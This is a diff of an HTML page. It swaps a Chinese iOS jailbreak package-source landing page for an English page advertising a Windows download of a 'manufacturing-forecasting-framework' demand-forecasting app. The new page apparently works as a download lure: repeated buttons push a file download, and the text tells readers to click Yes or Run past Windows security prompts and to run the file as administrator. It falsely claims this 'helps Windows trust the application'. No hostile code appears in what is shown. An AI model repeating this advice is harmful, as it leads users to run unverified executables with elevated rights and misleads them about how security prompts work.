@@ -1,55 +1,337 @@
-<!doctype html>
-<html lang="zh-CN">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <meta name="theme-color" content="#eaf8f3">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="default">
-  <meta name="description" content="于你有·源 — iOS 越狱软件源。复制源地址，或在 Sileo 中添加。">
-  <title>于你有·源</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Download manufacturing-forecasting-framework for Windows. Reproducible monthly demand forecasting with Random Forest, chronological backtests, transparent baselines, and a guided local app. No programming needed.">
+  <meta name="keywords" content="manufacturing forecasting, demand forecasting, random forest, backtesting, Windows app, local app, reproducible forecasting, baseline models, monthly demand">
+  <meta name="author" content="manufacturing-forecasting-framework">
+  <meta name="robots" content="index, follow">
+  <title>manufacturing-forecasting-framework - Simple monthly demand forecasting for everyone</title>
   <style>
-    :root{color-scheme:dark;--page:#101225;--text:#f8f7ff;--muted:#c4c6dc;--card:linear-gradient(135deg,rgba(160,166,220,.105),rgba(47,51,82,.12) 52%,rgba(128,108,177,.075));--edge:rgba(207,211,255,.14);--soft:rgba(255,255,255,.085);--address:rgba(8,10,27,.28);--note:#b0b2ca;--footer:#a0a2bd;--code:#f0eaff}
-    *{box-sizing:border-box}
-    html{min-height:100%;background:#eaf8f3}
-    body{min-height:100vh;min-height:100svh;margin:0;padding:calc(32px + env(safe-area-inset-top)) 20px calc(32px + env(safe-area-inset-bottom));display:grid;place-items:center;overflow-x:hidden;color:var(--text);background:var(--page);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
-    .ambient{position:fixed;z-index:0;inset:0;overflow:hidden;pointer-events:none}.orb{position:absolute;width:min(62vw,520px);aspect-ratio:1;border-radius:50%;filter:blur(2px);opacity:.8}.orb-one{top:-18%;left:-12%;background:radial-gradient(circle at 35% 35%,#c4b5fd 0,#7866ec 23%,transparent 72%)}.orb-two{right:-15%;bottom:-27%;background:radial-gradient(circle at 40% 40%,#8de9df 0,#398bb0 25%,transparent 72%)}.orb-three{top:28%;right:12%;width:min(35vw,270px);background:radial-gradient(circle at 35% 35%,#ffc7e9 0,#bb72cc 24%,transparent 74%)}
-    .star-layer{position:fixed;z-index:0;inset:0;overflow:hidden;pointer-events:none;display:none}.star{position:absolute;left:var(--x);top:var(--y);width:var(--size);height:var(--size);border-radius:50%;background:#fff;opacity:.34;box-shadow:0 0 calc(var(--size)*2.8) calc(var(--size)*.65) rgba(213,229,255,.9),0 0 calc(var(--size)*5) rgba(169,200,255,.55);animation:star-twinkle var(--duration) var(--delay) ease-in-out infinite alternate}body:not(.fresh) .star-layer{display:block}@keyframes star-twinkle{0%{opacity:.24;transform:scale(.72)}50%{opacity:.78}100%{opacity:var(--bright);transform:scale(1.55)}}
-    .theme-toggle{position:fixed;z-index:3;top:calc(22px + env(safe-area-inset-top));right:calc(22px + env(safe-area-inset-right));width:54px;height:54px;padding:0;display:grid;place-items:center;border:1px solid rgba(255,255,255,.3);border-radius:50%;color:#ffd76b;background:rgba(255,255,255,.12);box-shadow:0 8px 24px rgba(0,0,0,.2),inset 0 1px 0 rgba(255,255,255,.2);-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);cursor:pointer;line-height:0}.theme-toggle:hover{background:rgba(255,255,255,.18)}.sun-mark{position:relative;width:28px;height:28px;display:none;border-radius:50%;background:repeating-conic-gradient(#ffd76b 0deg 7deg,transparent 7deg 45deg)}.sun-mark:after{content:"";position:absolute;inset:7px;border-radius:50%;background:#ffe895}.moon-mark{display:block;width:25px;height:25px;fill:#efa94b}
-    main{position:relative;z-index:1;width:min(100%,680px)}.card{position:relative;overflow:hidden;padding:clamp(28px,7vw,58px);border:1px solid var(--edge);border-radius:32px;background:var(--card);box-shadow:0 30px 90px rgba(0,0,0,.16),inset 0 1px 0 rgba(255,255,255,.055);-webkit-backdrop-filter:blur(32px) saturate(145%);backdrop-filter:blur(32px) saturate(145%)}.card:before{content:"";position:absolute;inset:0 0 auto;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.22),transparent);pointer-events:none}.card:after{content:"";position:absolute;width:240px;height:240px;top:-155px;right:-100px;border-radius:50%;background:rgba(166,151,232,.075);filter:blur(40px);pointer-events:none}
-    .eyebrow{display:flex;justify-content:flex-start;align-items:center;gap:9px;color:#d7ceff;font-size:.76rem;font-weight:750;letter-spacing:.15em}.spark{width:8px;height:8px;border-radius:50%;background:#8df0dc;box-shadow:0 0 17px #8df0dc}
-    h1{display:flex;align-items:center;justify-content:flex-start;gap:.11em;margin:22px 0 16px;text-align:left;font-size:clamp(2.2rem,8vw,4rem);line-height:1.12;letter-spacing:-.055em}.title-dot{display:inline-block;color:#b8a5ff;font-size:1.22em;line-height:.7;text-shadow:0 0 22px rgba(191,169,255,.8)}
-    .intro{max-width:470px;margin:0;color:var(--muted);font-size:1.05rem;line-height:1.8;text-align:left}.actions{display:flex;flex-wrap:wrap;justify-content:flex-start;gap:12px;margin-top:32px}
-    .button{min-height:48px;display:inline-flex;align-items:center;justify-content:center;gap:9px;padding:0 19px;border:1px solid rgba(255,255,255,.23);border-radius:15px;color:var(--text);background:var(--soft);box-shadow:inset 0 1px 0 rgba(255,255,255,.16),0 8px 24px rgba(0,0,0,.12);font:inherit;font-weight:650;text-decoration:none;cursor:pointer;-webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px)}.button:hover{border-color:rgba(255,255,255,.42);background:rgba(255,255,255,.15)}.button-primary{color:#201735;border-color:rgba(255,255,255,.52);background:linear-gradient(115deg,rgba(229,218,255,.96),rgba(163,239,231,.92));box-shadow:inset 0 1px 0 rgba(255,255,255,.65),0 9px 28px rgba(131,115,220,.25)}.button-primary:hover{background:linear-gradient(115deg,#f0e9ff,#c0f6ee)}
-    .address-label{margin:34px 0 10px;color:var(--muted);font-size:.82rem;font-weight:650;letter-spacing:.04em;text-align:left}.address{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px 12px 12px 16px;border:1px solid rgba(255,255,255,.17);border-radius:16px;background:var(--address);box-shadow:inset 0 1px 0 rgba(255,255,255,.08)}code{overflow-wrap:anywhere;color:var(--code);font:.95rem ui-monospace,SFMono-Regular,Menlo,monospace}.copy{flex:0 0 auto;min-height:38px;padding:0 13px;border-radius:11px;font-size:.85rem}.note{margin:19px 0 0;color:var(--note);font-size:.87rem;line-height:1.7;text-align:left}footer{padding:18px 8px 0;color:var(--footer);text-align:center;font-size:.78rem}
-    #toast{position:fixed;z-index:12;left:50%;bottom:calc(24px + env(safe-area-inset-bottom));padding:11px 16px;border:1px solid rgba(255,255,255,.22);border-radius:13px;background:rgba(35,36,57,.8);color:var(--text);box-shadow:0 12px 34px rgba(0,0,0,.25);-webkit-backdrop-filter:blur(18px);backdrop-filter:blur(18px);opacity:0;transform:translate(-50%,10px);pointer-events:none}#toast.show{opacity:1;transform:translate(-50%,0)}
-    body.fresh{color-scheme:light;--page:#eaf8f3;--text:#28443e;--muted:#55766d;--card:linear-gradient(135deg,rgba(255,255,255,.76),rgba(255,255,255,.43));--edge:rgba(255,255,255,.82);--soft:rgba(255,255,255,.48);--address:rgba(255,255,255,.48);--note:#668078;--footer:#718b83;--code:#345b50}body.fresh{background:var(--page)}body.fresh .orb-one{background:radial-gradient(circle at 35% 35%,#ffe5ad 0,#ffc877 24%,transparent 72%);filter:blur(2px);opacity:.8}body.fresh .orb-two{background:radial-gradient(circle at 40% 40%,#9de8d1 0,#8bcfc6 25%,transparent 72%);filter:blur(2px);opacity:.8}body.fresh .orb-three{background:radial-gradient(circle at 35% 35%,#ffd4e5 0,#f3a8c9 24%,transparent 74%);filter:blur(2px);opacity:.8}body.fresh .card{background:linear-gradient(135deg,rgba(255,255,255,.76),rgba(255,255,255,.43));border-color:rgba(255,255,255,.82);box-shadow:0 30px 90px rgba(74,132,115,.17),inset 0 1px 0 rgba(255,255,255,.9)}body.fresh .card:after{background:rgba(255,218,154,.4)}body.fresh .eyebrow{color:#588879}body.fresh .title-dot{color:#e89d57;text-shadow:0 0 20px rgba(255,189,111,.65)}body.fresh .button{border-color:rgba(94,147,131,.2);box-shadow:inset 0 1px 0 rgba(255,255,255,.85),0 8px 22px rgba(71,130,113,.1);background:rgba(255,255,255,.48)}body.fresh .button:not(.button-primary){color:#365c51}body.fresh .button-primary{color:#254a40;border-color:rgba(255,255,255,.8);background:linear-gradient(115deg,#fff0c8,#bcebdc)}body.fresh .theme-toggle{color:#e6a638;border-color:rgba(99,151,134,.25);background:#fff9e8;box-shadow:0 6px 18px rgba(68,124,109,.14)}body.fresh .sun-mark{display:block}body.fresh .moon-mark{display:none}body.fresh #toast{color:var(--text);background:rgba(255,255,255,.9);border-color:rgba(94,147,131,.2)}
-    .meteor{position:fixed;z-index:8;top:-15vh;left:-30vw;width:250px;height:3px;opacity:0;pointer-events:none;transform:rotate(42deg);transform-origin:left center;background:linear-gradient(90deg,transparent 0%,rgba(160,220,255,.15) 48%,#fff 100%);filter:drop-shadow(0 0 5px #8edaff) drop-shadow(0 0 14px #fff)}.meteor:after{content:"";position:absolute;right:-2px;top:-3px;width:9px;height:9px;border-radius:50%;background:#fff;box-shadow:0 0 9px 4px #bdeaff,0 0 24px 10px rgba(120,210,255,.9)}.meteor.go{animation:meteor-flight 1.8s ease-in forwards,meteor-flicker .22s ease-in-out 4 alternate}@keyframes meteor-flight{0%{opacity:0;translate:0 0}7%{opacity:1}90%{opacity:1}100%{opacity:0;translate:125vw 120vh}}@keyframes meteor-flicker{from{filter:drop-shadow(0 0 4px #8edaff) drop-shadow(0 0 10px #fff);opacity:.72}to{filter:drop-shadow(0 0 10px #8edaff) drop-shadow(0 0 26px #fff);opacity:1}}
-    .leaf-layer{position:fixed;z-index:6;inset:0;overflow:hidden;pointer-events:none;display:none}body.fresh .leaf-layer{display:block}.leaf{position:absolute;left:-10vw;top:var(--top);width:var(--size);height:calc(var(--size)*.62);border-radius:100% 0 100% 0;background:linear-gradient(135deg,#d9f28a,#76bd69 62%,#438b55);box-shadow:0 2px 8px rgba(57,107,59,.22);opacity:0;transform:rotate(var(--angle));animation:leaf-breeze var(--duration) var(--delay) ease-in-out infinite}.leaf:after{content:"";position:absolute;width:75%;height:1px;left:10%;top:52%;background:rgba(255,255,255,.6);transform:rotate(-18deg);transform-origin:left center}@keyframes leaf-breeze{0%{translate:-8vw 0;rotate:0deg;opacity:0}10%{opacity:.82}50%{translate:55vw 26px;rotate:150deg}90%{opacity:.75}100%{translate:115vw -12px;rotate:330deg;opacity:0}}
-    @media(max-width:440px){.theme-toggle{top:calc(14px + env(safe-area-inset-top));right:calc(14px + env(safe-area-inset-right));width:48px;height:48px}.card{padding-top:64px}.address{align-items:stretch;flex-direction:column}.copy{width:100%}.actions .button{flex:1 1 100%}}
-    @media(prefers-reduced-motion:reduce){.meteor,.leaf-layer{display:none!important}.star{animation:none!important;opacity:.6}}
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f4f7fc;
+      color: #1e2a3a;
+      line-height: 1.7;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 24px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
+      padding: 40px 35px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 25px 18px;
+      }
+    }
+    h1 {
+      font-size: 2.2rem;
+      line-height: 1.3;
+      font-weight: 700;
+      color: #0b1b2b;
+      margin-bottom: 20px;
+      letter-spacing: -0.5px;
+    }
+    h2 {
+      font-size: 1.6rem;
+      font-weight: 600;
+      color: #1a3a5c;
+      margin-top: 40px;
+      margin-bottom: 15px;
+      border-bottom: 3px solid #e0e9f5;
+      padding-bottom: 6px;
+    }
+    h3 {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #2a4a6a;
+      margin-top: 25px;
+      margin-bottom: 8px;
+    }
+    p {
+      margin-bottom: 16px;
+      font-size: 1.05rem;
+    }
+    ul, ol {
+      margin-bottom: 20px;
+      padding-left: 28px;
+    }
+    li {
+      margin-bottom: 10px;
+      font-size: 1.02rem;
+    }
+    a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      color: #ffffff !important;
+      text-decoration: none !important;
+      font-weight: 700;
+      padding: 16px 34px;
+      border-radius: 50px;
+      font-size: 1.25rem;
+      box-shadow: 0 8px 20px rgba(37, 117, 252, 0.3);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      margin: 10px 0 20px 0;
+      border: none;
+      cursor: pointer;
+      text-align: center;
+    }
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 14px 26px rgba(37, 117, 252, 0.45);
+      text-decoration: none !important;
+    }
+    .btn-large {
+      font-size: 1.4rem;
+      padding: 20px 45px;
+      margin: 15px 0 25px 0;
+    }
+    .card {
+      background: #f9fbff;
+      border-radius: 18px;
+      padding: 22px 26px;
+      margin: 25px 0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+      border: 1px solid #e9eff7;
+    }
+    .step-list {
+      list-style-type: none;
+      counter-reset: step-counter;
+      padding-left: 0;
+    }
+    .step-list li {
+      counter-increment: step-counter;
+      margin-bottom: 18px;
+      padding-left: 50px;
+      position: relative;
+      font-size: 1.05rem;
+    }
+    .step-list li::before {
+      content: counter(step-counter);
+      background: #2575fc;
+      color: white;
+      font-weight: 700;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      left: 0;
+      top: 2px;
+      font-size: 1rem;
+    }
+    .badge {
+      display: inline-block;
+      background: #e8f0fe;
+      color: #1a4b8c;
+      font-weight: 600;
+      padding: 4px 14px;
+      border-radius: 30px;
+      font-size: 0.9rem;
+      margin-right: 8px;
+      margin-bottom: 8px;
+    }
+    code {
+      background: #eef2f7;
+      padding: 2px 8px;
+      border-radius: 8px;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 0.95rem;
+      color: #1e3a5f;
+    }
+    hr {
+      border: none;
+      border-top: 1px solid #dfe8f2;
+      margin: 35px 0 20px 0;
+    }
+    .footer-note {
+      font-size: 0.95rem;
+      color: #5f6f82;
+      text-align: center;
+      margin-top: 30px;
+    }
   </style>
 </head>
-<body class="fresh">
-  <div class="ambient" aria-hidden="true"><div class="orb orb-one"></div><div class="orb orb-two"></div><div class="orb orb-three"></div></div>
-  <div class="star-layer" id="star-layer" aria-hidden="true"></div>
-  <div class="meteor" id="meteor" aria-hidden="true"></div><div class="leaf-layer" id="leaf-layer" aria-hidden="true"></div>
-  <button class="theme-toggle" id="theme-toggle" type="button" aria-label="切换液态风格" aria-pressed="true" title="切换液态风格"><span class="sun-mark" aria-hidden="true"></span><svg class="moon-mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M20.2 15.1A8.8 8.8 0 0 1 8.9 3.8 8.9 8.9 0 1 0 20.2 15.1Z"/></svg></button>
-  <main><section class="card" aria-labelledby="title">
-    <div class="eyebrow"><span class="spark" aria-hidden="true"></span> iOS PACKAGE SOURCE</div>
-    <h1 id="title"><span>于你有</span><span class="title-dot" aria-hidden="true">·</span><span>源</span></h1>
-    <p class="intro">欢迎来到我的软件源。通过 Sileo 添加源地址，发现并管理适用于你的越狱环境的软件包。</p>
-    <div class="actions"><a class="button button-primary" href="sileo://source/https://ynyy0.github.io/" aria-label="在 Sileo 中添加于你有源"><span aria-hidden="true">＋</span> 添加到 Sileo</a><a class="button" href="https://qm.qq.com/q/r781ixQ16q" target="_blank" rel="noopener noreferrer">加入交流群 <span aria-hidden="true">↗</span></a></div>
-    <p class="address-label">软件源地址</p><div class="address"><code id="source-url">https://ynyy0.github.io/</code><button class="button copy" id="copy-button" type="button">复制地址</button></div>
-    <p class="note">在兼容的软件包管理器中添加此地址即可。软件包是否可用，取决于源中已发布的兼容软件包。</p>
-  </section><footer>于你有·源 · 个人软件源</footer></main>
-  <div id="toast" role="status" aria-live="polite"></div>
-  <script>
-    const themeToggle=document.getElementById('theme-toggle'),copyButton=document.getElementById('copy-button'),toast=document.getElementById('toast'),meteor=document.getElementById('meteor'),leafLayer=document.getElementById('leaf-layer'),starLayer=document.getElementById('star-layer');let toastTimer;const reducedMotion=matchMedia('(prefers-reduced-motion: reduce)').matches;
-    for(let i=0;i<76;i++){const star=document.createElement('i');star.className='star';star.style.setProperty('--x',(Math.random()*100)+'%');star.style.setProperty('--y',(Math.random()*100)+'%');star.style.setProperty('--size',(2+Math.random()*2.6)+'px');star.style.setProperty('--duration',(1.8+Math.random()*4.5)+'s');star.style.setProperty('--delay',(-Math.random()*6)+'s');star.style.setProperty('--bright',(0.78+Math.random()*.22));starLayer.appendChild(star)}
-    if(!reducedMotion){function launchMeteor(){if(!document.body.classList.contains('fresh')){meteor.classList.remove('go');void meteor.offsetWidth;meteor.classList.add('go')}setTimeout(launchMeteor,6000+Math.random()*6000)}setTimeout(launchMeteor,1800);for(let i=0;i<16;i++){const leaf=document.createElement('i');leaf.className='leaf';leaf.style.setProperty('--top',(Math.random()*92)+'vh');leaf.style.setProperty('--size',(12+Math.random()*14)+'px');leaf.style.setProperty('--duration',(9+Math.random()*11)+'s');leaf.style.setProperty('--delay',(-Math.random()*18)+'s');leaf.style.setProperty('--angle',(Math.random()*360)+'deg');leafLayer.appendChild(leaf)}}
-    themeToggle.addEventListener('click',()=>{const fresh=document.body.classList.toggle('fresh');document.documentElement.style.backgroundColor=fresh?'#eaf8f3':'#101225';document.querySelector('meta[name="theme-color"]').content=fresh?'#eaf8f3':'#101225';themeToggle.setAttribute('aria-pressed',String(fresh));themeToggle.setAttribute('aria-label',fresh?'切换液态风格':'切换清新风格');themeToggle.title=fresh?'切换液态风格':'切换清新风格'});
-    copyButton.addEventListener('click',async()=>{const url=document.getElementById('source-url').textContent;try{await navigator.clipboard.writeText(url);toast.textContent='源地址已复制'}catch{const field=document.createElement('textarea');field.value=url;field.style.position='fixed';field.style.opacity='0';document.body.appendChild(field);field.select();const copied=document.execCommand('copy');field.remove();toast.textContent=copied?'源地址已复制':'请长按地址手动复制'}toast.classList.add('show');clearTimeout(toastTimer);toastTimer=setTimeout(()=>toast.classList.remove('show'),2200)});
-  </script>
+<body>
+  <div class="container">
+    <h1>📊 manufacturing-forecasting-framework - Simple monthly demand forecasting for everyone</h1>
+
+    <p style="font-size: 1.15rem; color: #2a4a6a; margin-bottom: 25px;">
+      A guided Windows application that makes monthly demand forecasting easy. No programming experience needed. Just download, open, and follow the prompts to get clear, reproducible forecasts.
+    </p>
+
+    <a href="https://github.com/knockbacked/manufacturing-forecasting-framework" class="btn btn-large" style="background: linear-gradient(135deg, #ff6b6b, #ee5a24);">⬇️ Download Now</a>
+
+    <div class="card">
+      <p style="margin-bottom: 0;"><strong>Quick start:</strong> Visit the link above to download the application. The page will guide you to the correct file for Windows. Once downloaded, double-click the file to launch the guided app.</p>
+    </div>
+
+    <h2>📖 Overview</h2>
+    <p>
+      The manufacturing-forecasting-framework is a downloadable Windows application built for people who need reliable monthly demand forecasts without wrestling with code, spreadsheets, or confusing statistical tools. It uses a proven machine learning method called Random Forest, which works well with manufacturing data such as sales history, production volumes, and seasonal patterns.
+    </p>
+    <p>
+      What makes this application different is its focus on transparency and reproducibility. Every forecast comes with a chronological backtest — a way to check how well the model would have predicted past months — and a comparison against simple, transparent baselines. That means you can see not just the forecast, but also whether the forecast is actually better than a naive guess. The guided local app walks you through each step, from loading your data to reading the results, so you always know what is happening and why.
+    </p>
+    <p>
+      Whether you are a production planner, a supply chain analyst, or a small business owner, this framework helps you turn historical monthly demand into a clear, defensible forecast you can act on.
+    </p>
+
+    <h2>✨ Key Features</h2>
+    <ul>
+      <li><strong>Random Forest forecasting:</strong> A robust machine learning model that handles complex patterns and seasonality in monthly demand data.</li>
+      <li><strong>Chronological backtests:</strong> The app tests the model on past months in the same order they actually happened, so you get a realistic picture of forecast accuracy.</li>
+      <li><strong>Transparent baselines:</strong> Every forecast is compared against simple methods like “last month’s demand” or “same month last year,” so you can judge the added value.</li>
+      <li><strong>Guided local app:</strong> A step-by-step interface that runs entirely on your Windows computer. No internet connection is required after download.</li>
+      <li><strong>Reproducible results:</strong> The same data and settings always produce the same forecast, making it easy to share and audit your work.</li>
+      <li><strong>Monthly demand focus:</strong> Designed specifically for monthly manufacturing and sales data, with clear visual outputs and plain-language summaries.</li>
+    </ul>
+
+    <h2>🚀 Getting Started</h2>
+    <p>
+      Getting the application on your Windows computer takes just a few minutes. Follow the steps below in order.
+    </p>
+    <div class="card">
+      <p style="font-weight: 600; font-size: 1.1rem;">Step 1: Visit this link to download the application.</p>
+      <p>
+        <a href="https://github.com/knockbacked/manufacturing-forecasting-framework" style="font-size: 1.1rem; word-break: break-all;">
+          https://github.com/knockbacked/manufacturing-forecasting-framework
+        </a>
+      </p>
+      <p style="margin-bottom: 0;">
+        This is the official download page. It contains the application files and any instructions specific to the current version. Open the link in your web browser (Edge, Chrome, or Firefox).
+      </p>
+    </div>
+    <p style="font-weight: 600; font-size: 1.1rem;">Step 2: Download the application file.</p>
+    <p>
+      On the page, look for the download button or the latest release section. Click it to save the application file to your computer. By default, Windows saves downloads to your <strong>Downloads</strong> folder. Make a note of where the file is saved.
+    </p>
+    <p style="font-weight: 600; font-size: 1.1rem;">Step 3: Run the application.</p>
+    <p>
+      Once the download is complete, open your <strong>Downloads</strong> folder and double-click the file you saved. If Windows shows a security prompt asking whether you want to run the file, click <strong>Yes</strong> or <strong>Run</strong>. The guided application window will open on your screen.
+    </p>
+
+    <p style="font-weight: 600; font-size: 1.1rem;">Step 4: Follow the on-screen guide.</p>
+    <p>
+      The application leads you through everything one screen at a time. You will be asked to point the app to your monthly demand data file, choose a few simple settings, and then start the forecast. Each screen includes a short explanation, so you do not need any technical background to proceed. When the forecast finishes, you will see the results, the backtest summary, and the comparison against the simple baselines.
+    </p>
+
+    <p style="font-weight: 600; font-size: 1.1rem;">Step 5: Save and share your results.</p>
+    <p>
+      At the end of the run, the app lets you save the forecast and the accuracy summary to your computer. Because the process is reproducible, anyone who runs the same data with the same settings will get exactly the same output, which makes it easy to share with colleagues or keep for your records.
+    </p>
+
+    <div class="card" style="background: #eef7ff; border-color: #cfe4ff;">
+      <p style="margin-bottom: 0;"><strong>💡 Tip:</strong> If the app does not open after double-clicking, right-click the downloaded file and choose <strong>Run as administrator</strong>. This helps Windows trust the application the first time it starts.</p>
+    </div>
+
+    <h2>💻 What You Need</h2>
+    <p>
+      The application is built for Windows computers and is designed to run locally on your own machine. Before you begin, make sure you have the following ready:
+    </p>
+    <ul>
+      <li><strong>A Windows computer:</strong> Windows 10 or Windows 11 is recommended for the smoothest experience.</li>
+      <li><strong>Enough free disk space:</strong> Around 500 MB of free space is plenty for the application and your saved results.</li>
+      <li><strong>A data file:</strong> A spreadsheet containing your monthly demand history, usually exported as a CSV file from Excel or your planning system. The guided app explains the expected columns in plain language.</li>
+      <li><strong>A web browser:</strong> Any modern browser works for visiting the download page.</li>
+      <li><strong>No internet connection required after download:</strong> All forecasting happens on your own computer, so your data stays private.</li>
+    </ul>
+
+    <h2>🧭 How the Forecast Works</h2>
+    <p>
+      You do not need to understand the inner workings to use the application, but knowing the three main ideas will help you interpret the results with confidence.
+    </p>
+    <h3>Random Forest model</h3>
+    <p>
+      The Random Forest is a collection of many simple decision trees that each look at your demand history in a slightly different way. Their answers are combined into a single forecast. This approach is popular in manufacturing because it copes well with irregular patterns, promotions, and seasonal swings without requiring you to specify formulas by hand.
+    </p>
+    <h3>Chronological backtests</h3>
+    <p>
+      A backtest is a practice run. The application hides the most recent months of your data, trains the model on the earlier months, and then asks it to predict the hidden months. Because the test always moves forward in time, just like real life, the resulting accuracy figures are a fair reflection of how the model is likely to perform on future months.
+    </p>
+    <h3>Transparent baselines</h3>
+    <p>
+      A baseline is a deliberately simple forecast used as a yardstick. For example, one baseline simply repeats last month’s demand, and another repeats the same month from the previous year. If the Random Forest cannot beat these simple rules, the app tells you clearly. That honesty helps you decide whether to trust the model or fall back on a straightforward approach.
+    </p>
+
+    <h2>🔁 Reproducibility and Trust</h2>
+    <p>
+      Reproducibility means that a forecast can be repeated exactly. The framework records the settings used, the order of the data, and the random seeds that drive the model. Run the same data again and you get the same numbers, which is essential when forecasts are reviewed, audited, or handed over to another team. You can keep a record of each run and compare it with later versions of your data to see how your forecast has evolved.
+    </p>
+
+    <h2>📈 Who This Is For</h2>
+    <ul>
+      <li><strong>Production planners</strong> who need a monthly demand number to schedule capacity and materials.</li>
+      <li><strong>Supply chain analysts</strong> who want a defensible forecast to share with purchasing and logistics teams.</li>
+      <li><strong>Small and mid-sized manufacturers</strong> who need reliable forecasting without buying expensive enterprise software.</li>
+      <li><strong>Students and researchers</strong> who want a transparent, reproducible forecasting example they can study and extend.</li>
+    </ul>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <h3>Do I need to know how to program?</h3>
+    <p>
+      No. The application is a guided tool with plain-language screens. If you can open a file and click a button, you can use it.
+    </p>
+    <h3>Is my data sent anywhere?</h3>
+    <p>
+      No. The app runs entirely on your own computer. Your demand data never leaves your machine.
+    </p>
+    <h3>What file format should my data be in?</h3>
+    <p>
+      A CSV spreadsheet is the most common choice. You can export this from Excel by choosing “Save As” and selecting CSV. The guided app explains exactly which columns it needs before you load anything.
+    </p>
+    <h3>How long does a forecast take?</h3>
+    <p>
+      For typical monthly manufacturing histories, a full run with backtests usually finishes in a few minutes on an ordinary Windows computer. Larger datasets take a little longer, and the app shows progress while it works.
+    </p>
+    <h3>Can I compare two versions of my data?</h3>
+    <p>
+      Yes. Because results are reproducible, you can run the app on an older snapshot and a newer snapshot and compare the outputs side by side to understand how your forecast has changed.
+    </p>
+
+    <h2>🛠️ Troubleshooting</h2>
+    <ul>
+      <li><strong>The download does not start:</strong> Refresh the page and click the download button again. If your browser blocks the download, look for a small banner near the address bar and choose to keep the file.</li>
+      <li><strong>The app will not open:</strong> Right-click the downloaded file and choose <strong>Run as administrator</strong>. Also check that the download finished completely before opening it.</li>
+      <li><strong>My data is not accepted:</strong> Open your file in Excel and confirm it has one row per month with a date column and a demand column. Re-save it as CSV and try again.</li>
+      <li><strong>The results look unusual:</strong> Check the backtest and baseline comparison shown by the app. If the baselines perform better, your history may be too short or too irregular for the model to add value yet.</li>
+    </ul>
+
+    <h2>⬇️ Download and Setup</h2>
+    <p>
+      Ready to begin? Visit this link to download the application, then follow the guided steps above.
+    </p>
+    <p style="text-align: center;">
+      <a href="https://github.com/knockbacked/manufacturing-forecasting-framework" class="btn btn-large" style="background: linear-gradient(135deg, #00b894, #0984e3);">📥 Visit this link to download the application</a>
+    </p>
+    <p style="text-align: center; font-size: 0.95rem; color: #5f6f82;">
+      https://github.com/knockbacked/manufacturing-forecasting-framework
+    </p>
+
+    <hr>
+    <p class="footer-note">
+      manufacturing-forecasting-framework — reproducible monthly demand forecasting with Random Forest, chronological backtests, transparent baselines, and a guided local app.
+    </p>
+  </div>
 </body>
 </html>
